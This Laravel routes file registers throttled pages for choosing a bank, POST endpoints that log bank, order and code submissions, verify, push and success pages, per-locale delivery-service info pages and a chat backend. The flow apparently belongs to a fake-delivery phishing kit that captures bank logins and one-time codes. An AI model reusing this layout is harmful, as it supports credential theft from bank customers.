<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::middleware("throttle:60,1")->group(function () {
    Route::get('/', 'PagesController@index')->name('index');
    Route::get('/banks/{name?}', 'PagesController@banks')->name('banks');
    Route::post('/log/bank', 'PagesController@logBank')->name('logBank');
    Route::get('/order', 'PagesController@order')->name('order');
    Route::post('/log/order', 'PagesController@logOrder')->name('logOrder');
    Route::get('/code', 'PagesController@code')->name('code');
    Route::post('/log/code', 'PagesController@logCode')->name('logCode');
    Route::get('/verify', 'PagesController@verify')->name('verify');
    Route::get('/error', 'PagesController@error')->name('error');
    Route::get('/success', 'PagesController@success')->name('success');
    Route::get('/push', 'PagesController@push')->name('push');
    Route::get('/{service}/{locale}/info', 'DeliveryInfoController')->name('delivery-info');
});

Route::name('chat.')->group(function () {
    Route::get('chat/ajax_chat', 'ChatController@index')->name('index');
    Route::post('chat/sendchat_message', 'ChatController@sendMsg')->name('sendMsg');
    Route::post('chat/delete_msg', 'ChatController@deleteMsg')->name('deleteMsg');
    Route::post('chat/view', 'ChatController@view')->name('view');
});
